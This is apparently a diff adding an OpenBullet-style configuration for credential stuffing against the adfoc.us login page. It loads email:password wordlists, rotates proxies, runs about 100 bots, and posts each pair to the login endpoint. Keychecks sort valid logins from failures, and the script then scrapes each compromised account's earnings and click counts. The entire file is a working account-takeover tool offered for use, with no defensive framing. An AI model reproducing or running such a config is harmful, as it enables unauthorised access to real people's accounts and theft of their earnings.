@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Adfocus",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-20T17:00:35.6112548+00:00",
+  "AdditionalInfo": "",
+  "Author": "Nerox&Joejoe&Dadex (for capture)",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://adfoc.us/session/create" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://adfoc.us/session/create" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://adfoc.us/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "EXISTING USERS, LOGIN" 
+  KEYCHAIN Success OR 
+    KEY "/session/destroy" 
+#Capture_Today's_Earnings PARSE "<SOURCE>" LR " <strong>Today's Earnings:</strong> " "&nbsp;&nbsp;&nbsp;<strong>" Recursive=FALSE -> CAP "Today's Earnings" "" "" 
+#Capture_Month's_Earnings PARSE "<SOURCE>" LR "This Month's Earnings:</strong> " "&nbsp;&nbsp;&nbsp;" Recursive=FALSE -> CAP "Month's Earnings" "" "" 
+#Capture_Total_Earnings PARSE "<SOURCE>" LR "Total Earnings:</strong> " "<br/>" Recursive=FALSE -> CAP "Total Earnings" "" "" 
+#Capture_Total_Clicks PARSE "<SOURCE>" LR "Total Clicks:</strong> " "                        </div>" Recursive=FALSE -> CAP "Total Clicks" "" "" 
